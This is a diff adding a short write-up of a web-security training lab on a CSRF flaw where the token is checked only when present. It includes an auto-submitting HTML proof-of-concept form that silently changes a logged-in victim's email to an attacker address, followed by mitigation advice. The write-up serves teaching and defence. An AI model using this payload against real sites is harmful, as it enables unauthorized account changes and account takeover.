@@ -1,0 +1,36 @@
+CSRF – Lab 3
+
+Summary:
+
+This lab demonstrates a Cross-Site Request Forgery (CSRF) vulnerability in the email change functionality. The application attempts to implement CSRF protection using a csrf parameter, but the validation is flawed.
+The server only validates the token if the parameter is present. If the csrf parameter is completely removed from the request, the server still processes the request successfully.
+
+Exploitation:
+
+After intercepting the email update request using Burp Suite, modifying the value of the csrf parameter caused the request to be rejected. However, removing the csrf parameter entirely allowed the request to be accepted by the server.
+This indicates that the application incorrectly validates the CSRF token only when the parameter exists.
+
+By crafting a malicious HTML page that sends a request without the `csrf` parameter, an attacker can force a logged-in victim to change their email address.
+
+CSRF PoC:
+
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="attacker@web-security-academy.net">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+
+When the victim visits this page while authenticated, their browser automatically sends the request and updates the account email.
+
+Impact:
+
+Attackers can bypass the CSRF protection and perform unauthorized actions on behalf of authenticated users.
+
+Mitigation:
+
+* Enforce strict validation of CSRF tokens.
+* Reject requests when the CSRF token is missing or invalid.
+* Implement additional protections such as SameSite cookies and Origin/Referer validation.
